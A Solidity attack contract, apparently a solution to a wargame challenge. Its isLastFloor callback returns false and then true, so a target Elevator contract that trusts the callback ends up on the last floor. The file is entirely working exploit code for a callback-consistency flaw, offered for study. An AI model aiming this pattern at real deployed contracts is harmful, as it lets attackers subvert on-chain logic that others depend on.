// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttacker {
    IElevator public elevator;
    uint private constant LAST_FLOOR = 1;
    bool private trigger;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function attack() external payable returns (bool) {
        elevator.goTo(LAST_FLOOR);
        return true;
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (trigger) {
            return true; 
        } else {
            trigger = true;
            return false;
        }
    }
}